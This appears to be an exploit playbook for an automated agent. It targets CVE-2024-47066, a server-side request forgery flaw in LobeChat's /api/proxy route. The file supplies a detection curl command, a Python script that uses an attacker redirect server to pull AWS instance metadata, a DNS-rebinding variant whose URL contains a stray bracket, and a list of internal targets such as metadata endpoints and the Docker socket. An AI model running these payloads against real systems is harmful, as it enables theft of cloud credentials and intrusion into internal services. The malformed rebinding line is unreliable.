---
name: lobechat-ssrf-redirect
description: "Use when LobeChat/Lobe found. SSRF via redirect."
---
# CVE-2024-47066 LobeChat SSRF via Redirect Bypass

## Overview
LobeChat < 1.19.13. The `/api/proxy` route checks if the target URL resolves to a private IP, but does **not** follow redirects during the check. An attacker provides an external URL that passes the IP check, then redirects to an internal resource.

## Detection
```bash
curl -s <TARGET>/api/proxy -X POST -d 'https://httpbin.org/get' \
  -o /dev/null -w '%{http_code}'
# 200 = proxy endpoint exists
```

## Exploitation
```python
import requests

TARGET = '<TARGET>'

# Step 1: Set up redirect server (or use a redirect service)
# Your server returns 302 to http://169.254.169.254/latest/meta-data/
# Example: https://your-server.com/redir?url=http://169.254.169.254/

# Step 2: Send through LobeChat proxy
r = requests.post(f'{TARGET}/api/proxy',
    data='https://your-redirect-server.com/go?target=http://169.254.169.254/latest/meta-data/',
    headers={'Content-Type': 'text/plain'})
print(r.text)  # AWS metadata!

# Alternative: DNS rebinding
# Use a domain that resolves to public IP first, then 127.0.0.1
# e.g., 1.2.3.4.1time.127.0.0.1.1time.repeat.rebind.network
r2 = requests.post(f'{TARGET}/api/proxy',
    data='http://a]1.2.3.4.1time.127.0.0.1.1time.repeat.rebind.network:3000/api/internal')
```

## Targets
- Cloud metadata: `169.254.169.254`, `100.100.100.200` (Alibaba)
- Internal services: `127.0.0.1:3000` (LobeChat itself), databases
- Docker socket: `http://172.17.0.1:2375`

## Pitfalls
- Fix in 1.19.13 follows redirects during IP check
- The proxy accepts the URL as raw POST body (text/plain), not JSON
- DNS rebinding needs low TTL domain — use rebind.network
- Source: EQSTLab/CVE-2024-47066